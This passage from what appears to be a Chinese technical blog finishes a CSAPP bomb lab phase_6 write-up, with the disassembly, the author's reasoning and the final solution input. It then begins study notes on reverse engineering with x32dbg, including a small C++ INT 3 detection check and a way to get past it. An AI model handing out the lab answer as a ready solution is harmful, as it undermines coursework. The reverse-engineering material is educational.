class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:push   r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:push   r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:push   r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:push   rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:push   rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:mov    r13,rsp</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:mov    r14,rsp</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:mov    r12d,0x0</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:mov    rbp,r13</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:sub    eax,0x1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:cmp    eax,0x5</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:add    r12d,0x1</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:add    ebx,0x1</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:add    r13,0x4</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:mov    rax,r14</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:mov    ecx,0x7</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:mov    edx,ecx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:add    rax,0x4</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:cmp    rax,rsi</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:mov    esi,0x0</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8]</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:add    eax,0x1</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:cmp    eax,ecx</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:add    rsi,0x4</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:mov    eax,0x1</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:add    rax,0x8</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:mov    ebp,0x5</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:pop    rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:pop    rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:pop    r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:pop    r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:pop    r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>有点小长，剖分一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010f4 &lt;+0&gt;:push   r14</span><br><span class="line">0x00000000004010f6 &lt;+2&gt;:push   r13</span><br><span class="line">0x00000000004010f8 &lt;+4&gt;:push   r12</span><br><span class="line">0x00000000004010fa &lt;+6&gt;:push   rbp</span><br><span class="line">0x00000000004010fb &lt;+7&gt;:push   rbx</span><br><span class="line">0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50</span><br><span class="line">0x0000000000401100 &lt;+12&gt;:mov    r13,rsp</span><br><span class="line">0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp</span><br><span class="line">0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure><p>这一部分是读入六个整数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040110b &lt;+23&gt;:mov    r14,rsp</span><br><span class="line">0x000000000040110e &lt;+26&gt;:mov    r12d,0x0</span><br><span class="line">0x0000000000401114 &lt;+32&gt;:mov    rbp,r13    ;let rbp=r13</span><br><span class="line">0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]</span><br><span class="line">0x000000000040111b &lt;+39&gt;:sub    eax,0x1</span><br><span class="line">0x000000000040111e &lt;+42&gt;:cmp    eax,0x5</span><br><span class="line">0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401128 &lt;+52&gt;:add    r12d,0x1</span><br><span class="line">0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6</span><br><span class="line">0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt; ;exit loop</span><br><span class="line">0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d</span><br><span class="line">0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx</span><br><span class="line">0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]    ;get number one by one</span><br><span class="line">0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax    ;must be not equal</span><br><span class="line">0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401145 &lt;+81&gt;:add    ebx,0x1</span><br><span class="line">0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5</span><br><span class="line">0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">0x000000000040114d &lt;+89&gt;:add    r13,0x4    ;r13 += 4</span><br><span class="line">0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]</span><br></pre></td></tr></table></figure><p>后面这里就是取出第一个值，然后判断减一之后要小于等于 5。</p><p>中间的一个循环感觉是要判断我们输入的数两两不一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]</span><br><span class="line">0x0000000000401158 &lt;+100&gt;:mov    rax,r14</span><br><span class="line">0x000000000040115b &lt;+103&gt;:mov    ecx,0x7</span><br><span class="line">0x0000000000401160 &lt;+108&gt;:mov    edx,ecx</span><br><span class="line">0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]</span><br><span class="line">0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx</span><br><span class="line">0x0000000000401166 &lt;+114&gt;:add    rax,0x4</span><br><span class="line">0x000000000040116a &lt;+118&gt;:cmp    rax,rsi</span><br><span class="line">0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一段逻辑应该就是 遍历所有的数，然后让那些数等于 7-value[i]。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040116f &lt;+123&gt;:mov    esi,0x0</span><br><span class="line">0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;   </span><br><span class="line">0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8]</span><br><span class="line">0x000000000040117a &lt;+134&gt;:add    eax,0x1</span><br><span class="line">0x000000000040117d &lt;+137&gt;:cmp    eax,ecx</span><br><span class="line">0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt; ;循环，类似取链表操作。</span><br><span class="line">0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0</span><br><span class="line">0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx</span><br><span class="line">0x000000000040118d &lt;+153&gt;:add    rsi,0x4</span><br><span class="line">0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18</span><br><span class="line">0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;    ;exit loop</span><br><span class="line">0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]    ;获取循环次数</span><br><span class="line">0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1</span><br><span class="line">0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">0x000000000040119f &lt;+171&gt;:mov    eax,0x1</span><br><span class="line">0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0   ;get basic address</span><br><span class="line">0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;   ;goto get link list</span><br><span class="line">0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]</span><br><span class="line">0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]</span><br><span class="line">0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]</span><br><span class="line">0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx</span><br><span class="line">0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]</span><br><span class="line">0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx</span><br><span class="line">0x00000000004011c4 &lt;+208&gt;:add    rax,0x8</span><br><span class="line">0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi</span><br><span class="line">0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;    ;exit loop</span><br><span class="line">0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx</span><br><span class="line">0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt; ; loop</span><br><span class="line">0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0</span><br><span class="line">0x00000000004011da &lt;+230&gt;:mov    ebp,0x5</span><br><span class="line">0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]</span><br><span class="line">0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax</span><br><span class="line">0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]</span><br><span class="line">0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1</span><br><span class="line">0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50</span><br><span class="line">0x00000000004011fb &lt;+263&gt;:pop    rbx</span><br><span class="line">0x00000000004011fc &lt;+264&gt;:pop    rbp</span><br><span class="line">0x00000000004011fd &lt;+265&gt;:pop    r12</span><br><span class="line">0x00000000004011ff &lt;+267&gt;:pop    r13</span><br><span class="line">0x0000000000401201 &lt;+269&gt;:pop    r14</span><br><span class="line">0x0000000000401203 &lt;+271&gt;:ret    </span><br></pre></td></tr></table></figure><p>它这里链表有一个基址，我们从基址这里开始，看看里面的 value。</p><p><img src="/2022/09/22/CSAPP_3/19.png"></p><p>他应该是按照我们输入的一个数字，然后取出链表对应深度的值，放到栈后面，然后比较是否严格 &gt;=，如果有一个小于就不行。我们在 +222 处下好一个断点，然后 1 2 3 4 5 6 输入看看。</p><p><img src="/2022/09/22/CSAPP_3/18.png"></p><p>可以发现，这里的 0x1bb 就是链表最后一个值，因为我们输入 1，然后用 7 减去得到了 6，所以第一个值就是最后一个值，我们先调整一下它自己的一个大小，排个序。下标排序为  2 1 6 5 4 3，再拿 7 减去得到 5 6 1 2 3 4。</p><p>但是输入发现还是爆炸了，动调，发现它要降序，后面的要大于等于前面的，但是因为前面判断不能重复，所以我们降序，倒一下顺序就可以实现了。</p><p>4 3 2 1 6 5</p><p><img src="/2022/09/22/CSAPP_3/21.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>phase_1：学习了 if 选择结构的汇编代码，并学会逆向分析选择结构的代码。</p><p>phase_2：学习了循环结构的汇编代码，并学会逆向分析循环结构的代码。</p><p>phase_3：学习了 switch 分发器的汇编代码，并用跳转表实现了其结构。</p><p>phase_4：学习了递归结构的汇编代码，并学会其逆向分析的方式。</p><p>phase_5：学习了基本逆向工程的写法，基本的字符串转变算法，了解了如何破解一个注册机程序。</p><p>phase_6：学习了链表的数据结构，结合数据结构合理地推测程序逻辑。</p><h2 id="CSAPP-attacklab"><a href="#CSAPP-attacklab" class="headerlink" title="CSAPP:attacklab"></a>CSAPP:attacklab</h2><p>待更新</p><h2 id="CSAPP-bufferlab"><a href="#CSAPP-bufferlab" class="headerlink" title="CSAPP:bufferlab"></a>CSAPP:bufferlab</h2><p>待更新</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;咕了有点久了，赶紧把新的章节预习完，捡出重点知识写一写文章。&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="程序的机器级表示" scheme="http://example.com/categories/csapp/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>《加密与解密》的学习</title>
    <link href="http://example.com/2022/09/14/KanxueBook/"/>
    <id>http://example.com/2022/09/14/KanxueBook/</id>
    <published>2022-09-13T16:00:00.000Z</published>
    <updated>2022-09-15T15:57:21.134Z</updated>
    
    <content type="html"><![CDATA[<p>最近好迷茫，所以又斥巨资买了一本充满力量的书，那就是看雪的《加密与解密》，也来彻底地玩一玩逆向吧。</p><span id="more"></span><h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><p>曾经的我，认为 <code>Linux</code> 天下第一好用，（虽然现在我也那么认为）但是 <code>windows </code>作为受众很广的操作系统，很多 <code>windows</code> 的程序也是有必要去学习一下的。</p><h3 id="win32API"><a href="#win32API" class="headerlink" title="win32API"></a>win32API</h3><p>当今大部分 <code>windows</code> 程序都是 <code>GUI</code>，<code>GUI</code> 是通过一系列 <code>API</code> 来完成的，具体<a href="KanxueBook/win32.chm">帮助手册</a>自行下载。</p><p>我们只需要知道一部分的，并且用到什么就学什么好了，比如常见的从控件中获取输入值，用接口 <code>GetDlgItemTextA</code>，弹窗反馈 <code>MessageBoxA</code>，当然这是比较常见的，具体调试的时候还得具体情况具体分析。</p><p><code>windows</code> 程序运行比较依赖动态链接库(dll)，可以理解为 <code>Linux</code> 下的 <code>.so</code> 文件。<code>windows</code>比较内核的三个动态链接库为</p><ul><li><code>kernel(kernel32.dll)</code>：提供操作系统的核心服务。</li><li><code>user(user32.dll)</code>：提供用户输入和输出的接口。</li><li><code>GDI(GDI32.dll)</code>：提供图形设备接口。</li></ul><p>这里需要注意一点，就是很多接口的后缀 <code>A</code> 或者 <code>W</code> 表示它处理字符的一个字符集， <code>A</code> 表示 <code>ASCII</code> 码，<code>w</code> 表示 <code>unicode</code> 码。</p><h2 id="动态调试器"><a href="#动态调试器" class="headerlink" title="动态调试器"></a>动态调试器</h2><p>这本书介绍了很多的动态调试器，这里我还是比较喜欢 <code>x32dbg</code>，所以其它的我也不一一解读了，但是相同的特性也能拿来讲一讲记一记。</p><h3 id="直接调试"><a href="#直接调试" class="headerlink" title="直接调试"></a>直接调试</h3><p>打开调试器，在<strong>文件</strong> <code>-&gt;</code> <strong>打开</strong> 中选择自己要调试的文件，然后载入。</p><h3 id="附加调试"><a href="#附加调试" class="headerlink" title="附加调试"></a>附加调试</h3><p>打开调试器，在<strong>文件</strong> <code>-&gt;</code> <strong>附加</strong> 中选择自己要附加调试的进程，然后载入。</p><hr><p>感觉附加调试会好一点吧，毕竟能先让程序运行到自己想调试的点然后再去调试，这样省了前面入口点的一些操作，但是我们要调试关键信息，一定是要下<strong>断点</strong>(<strong>break point</strong>)的。</p><p>这里我们直接用 <code>chap02\OllyDbg调试器\2.1.4 基本操作\bin\ASCII版\TraceMe.exe</code> 来试试手。</p><p><img src="/2022/09/14/KanxueBook/1.png" alt="1"></p><p>调试器整体呈这样，最上面一行肯定是标签栏，工具栏，选项卡。剩余窗口大致分为四块。<code>CPU</code> 选项卡中的窗口表现出来就是代码窗口，最右边的窗口时寄存器窗口，左下角的窗口是内存窗口，右下角的窗口是栈窗口，最下面一行的文本框可以用于打命令使用。</p><h3 id="CPU窗口"><a href="#CPU窗口" class="headerlink" title="CPU窗口"></a>CPU窗口</h3><p>大概分了五列，如下图所示。</p><p><img src="/2022/09/14/KanxueBook/2.png" alt="2"></p><ul><li>对于第一列，更多的是标识跳转的作用，以及设置断点。</li><li>第二列标识了当前内存地址的地址，<strong>双击</strong>可以显示改行的相对地址偏移，再次双击恢复。</li><li>第三列标识了该地址的内存字节，<strong>双击</strong>可以下断点。</li><li>第四列标识了该字节码的反汇编代码，选中使用 <strong>空格</strong> 键可以修改汇编代码。</li><li>第五列提供了一些内存地址或者是寄存器的值，也可以用 <code>;</code> 键去添加注释。</li></ul><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>断点大致分为以下几种类型</p><ul><li><code>INT 3</code> 断点</li><li>硬件断点</li><li>内存断点</li><li>消息断点</li><li>条件断点</li></ul><h4 id="INT-3断点"><a href="#INT-3断点" class="headerlink" title="INT 3断点"></a>INT 3断点</h4><p><code>INT 3</code> 是一条汇编指令，其机器码是 <code>0xCC</code> 所以也叫 <code>CC</code> 指令。执行这个指令的时候，会抛出一个 <code>break point exception</code> 异常，这个异常会被调试器捕获到，因此能达到断点的目的。在打断点的时候，会把这个地址设置为 <code>0xCC</code> ，也就是 <code>INT 3</code>  的机器码。优点是可以设置很多个断点，因为我们只要想，可以在任意地址把值改成 <code>0xCC</code> 以此达到断点的目的。但是带来的缺点就是会修改程序的内存，改变了原机器码，可能会被程序检测到。</p><p>比如这样的一个 <code>MFC</code> 程序，<a href="KanxueBook/TrackMe.exe">附件下载</a></p><p>source:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CTrackMeDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">HWND hWnd = <span class="built_in">AfxGetMainWnd</span>()-&gt;m_hWnd;</span><br><span class="line">QWORD Uaddr;</span><br><span class="line">BYTE Mark = <span class="number">0</span>;</span><br><span class="line">Uaddr = (QWORD)MessageBoxA;</span><br><span class="line">Mark = *(BYTE*)Uaddr;</span><br><span class="line"><span class="keyword">if</span> (Mark == <span class="number">0xCC</span>) &#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(hWnd, <span class="string">&quot;be tracked&quot;</span>, <span class="string">&quot;MessageBox&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(hWnd,<span class="string">&quot;Very OK&quot;</span>,<span class="string">&quot;MessageBox&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/14/KanxueBook/3.png" alt="3"></p><p>正常运行结果如图所示</p><p><img src="/2022/09/14/KanxueBook/4.png" alt="4"></p><p>如果放到调试器，对 <code>MessageBoxA</code> 这个函数下断点的话，那么就会导致出现另一个不同的运行结果。</p><p><img src="/2022/09/14/KanxueBook/5.png" alt="5"></p><p>因为我们断点设置在 <code>MessageBoxA</code> 上，而程序判断了 <code>MessageBoxA</code> 调用地址是否为 <code>INT 3</code> 指令(<code>0xCC</code>)，有的话就直接输出 <code>be tracked</code> 说明检测到这里下了 <code>INT 3</code> 断点。</p><p>如果我们要绕过检测同时又要求能断下来，那么我们可以在函数调用中间或者是末尾下 <code>INT 3</code> 断点。</p><h4 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h4><p>硬件断点主要是通过 <code>DRx</code> 寄存器实现的，<code>DR0~DR3</code> 分别用于保存硬件断点的地址，那我们也可以看出来它最多能同时存在四个硬件断点。<code>DR4-DR5</code> 未公开具体作用， <code>DR6</code> 用于保存寄存器组状态， <code>DR7</code> 用于保存寄存器组控制。硬件断点不会改变程序字节码，因此它更难被检测，在断点选项中可以设置硬件执行断点，同样，对于一般内存来说，我们可以设置硬件访问断点。</p><p>设置完成之后我们在寄存器窗口拉到最下面，可以看到 <code>DR</code> 寄存器，我们可以从前四个寄存器中找到我们下的硬件断点的位置。硬件断点的优势劣势与前面的 <code>INT 3</code> 断点相对，硬件断点不能同时大量设置，但是它不会更改进程代码段的内存。</p><h4 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h4><p>内存（读/写/执行）断点是通过将某一块内存页标记为对应的不可（读/写/执行），当程序尝试对该内存（读/写/执行）的时候就会抛出异常，转而给调试器进行异常处理，若发现访问内存刚好是断点位置时，程序断住，否则正常进行（读/写/执行）操作。由于在执行的时候，会有一个读取命令的操作，因此我们如果在代码断设置了内存访问断点，执行到指定位置时同样会被断住。</p><p>比如这个程序，我们在某一条指令上下内存读取断点</p><p><img src="/2022/09/14/KanxueBook/6.png" alt="6"></p><p>我们再次按 <code>F9</code> 继续执行可以发现程序停在了我们下的断点位置。</p><p><img src="/2022/09/14/KanxueBook/7.png" alt="7"></p><p>不知为何在经过一番激烈的讨论之后，认定  <code>x32dbg</code> 